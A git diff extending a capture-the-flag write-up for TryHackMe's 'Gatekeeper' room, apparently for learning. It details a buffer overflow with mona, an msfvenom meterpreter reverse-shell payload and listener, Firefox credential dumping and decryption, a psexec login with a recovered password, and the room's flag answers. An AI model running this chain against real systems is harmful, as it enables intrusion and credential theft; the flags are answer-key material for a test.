@@ -5,6 +5,11 @@
 [Gatekeeper](https://tryhackme.com/r/room/gatekeeper) is listed as an medium room. Can you get past the gate and through the fire? An overview of what we’ll be using is listed here:
 
 * Nmap
+* SMBclient
+* Python
+* Metasploit
+* firefox_decrypt
+* psexec.py
 
 ## Task 1 - Approach the Gates
 
@@ -38,7 +43,7 @@ Deploy the machine when you are ready to release the Gatekeeper.
 
 	![task1-nc](./images/task1-nc.png)
 
-	When we connect on this port, we try to send word "KakakSeram" and we get server response "Hello KakakSeram!!!"
+	When we connect on this port, we try to send word "KakakSeram" and we get Host response "Hello KakakSeram!!!"
 
 * Using SMBClient to list available shares on the host
 
@@ -190,12 +195,65 @@ Deploy the machine when you are ready to release the Gatekeeper.
 
 	![task1-exploit3](./images/task1-exploit3.png)
 
-* Restart **Immunity Debugger** and generate a bytearray using mona, and exclude the null byte (`\x00`)
+* Restart **Immunity Debugger** and generate a bytearray using mona, and exclude the null byte **\x00**
 
 	```
 	!mona bytearray -b "\x00"
 	```
 	
+	![task1-bytearray](./images/task1-bytearray.png)
+
+* Run `exploit.py`
+
+	![task1-runexp](./images/task1-runexp.png)
+
+	![task1-debug3](./images/task1-debug3.png)
+
+	We got ESP value = **007419E4**
+
+* Compare bytearray with ESP to get badchar
+
+	```
+	!mona compare -f D:\Project\mona\gatekeeper\bytearray.bin -a 007419E4
+	```
+
+	![task1-debug4](./images/task1-debug4.png)
+
+	We got possible badchar **00 0a** => **\x00\x0a**
+
+* Finding a jump code
+
+	```
+	!mona jmp -r esp -cpb "\x00\x0a"
+	```
+
+	![task1-debug5](./images/task1-debug5.png)
+
+	Note the address **080414C3** => **08 04 14 C3** => **\xc3\x14\x04\x08** written backwards since the system is little endian
+
+* Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously
+
+	```
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.127.223 LPORT=4444 -b "\x00\x0a" -f c
+	```
+
+	![task1-msfvenom](./images/task1-msfvenom.png)
+
+* Update `exploit.py` script and set the payload variable to the string of generated C code, set retn variable to jump address also add variable padding to  **"\x90" * 16**`** and change IP to target machine THM
+
+	![task1-exploit4](./images/task1-exploit4.png)
+
+* Setup listener on our attacker machine using msfconsole
+
+	```
+	msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 4444; exploit"
+	```
+
+	![task1-listener](./images/task1-listener.png)
+
+* Run `exploit.py` and get the shell
+
+	![task1-shell](./images/task1-shell.png)
 
 ## Task 2 - Defeat the Gatekeeper and pass through the fire
 
@@ -204,5 +262,66 @@ Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other
 ### Answer the questions below
 
 * Locate and find the User Flag.
+	
+	![task2-user](./images/task2-user.png)
+
+	**Answer : {H4lf_W4y_Th3r3}**
 
 * Locate and find the Root Flag
+
+	* In Desktop we found Firefox.Ink. Firefox.lnk this is shortcut icon thats meaning this machine have firefox browser. ok now press ctrl+z in meterpreter shell and choose yes kept it in background. Now press ctrl+z in meterpreter shell and choose yes kept it in background
+	
+		![task2-session](./images/task2-session.png)
+
+	* Dump proses to get credentials user from Firefox using Metasploit **firefox_creds**
+	
+		```
+		use post/multi/gather/firefox_creds
+		set SESSION 5
+		run
+		```
+
+		![task2-firefox](./images/task2-firefox.png)
+
+	* Rename and move dump file
+	
+		```
+		mv /home/kakakseram/.msf4/loot/20240731162800_default_10.10.60.199_ff.ljfn812a.cert_647379.bin cert9.db
+		mv /home/kakakseram/.msf4/loot/20240731162807_default_10.10.60.199_ff.ljfn812a.cook_687245.bin cookies.sqlite
+		mv /home/kakakseram/.msf4/loot/20240731162812_default_10.10.60.199_ff.ljfn812a.key4_578596.bin key4.db
+		mv /home/kakakseram/.msf4/loot/20240731162816_default_10.10.60.199_ff.ljfn812a.logi_686792.bin logins.json
+		```
+
+		![task2-move](./images/task2-move.png)
+
+	* Download and run Firefox decrypt tool
+	
+		```
+		git clone https://github.com/unode/firefox_decrypt.git
+		```
+
+		![task2-git](./images/task2-git.png)
+
+		```
+		python firefox_decrypt.py ~/THM/Gatekeeper/
+		```
+
+		![task2-decrypt](./images/task2-decrypt.png)
+
+		We found username and password
+
+	* Connect to Host using **psexec.py**
+	
+		```
+		python /usr/share/doc/python3-impacket/examples/psexec.py mayor:8CL7O1N78MdrCIsV@$IP
+		```
+
+		![task2-shel](./images/task2-shel.png)
+
+	* Get the root file
+	
+		![task2-root](./images/task2-root.png)
+
+	**Answer : {Th3_M4y0r_C0ngr4tul4t3s_U}**
+	
+
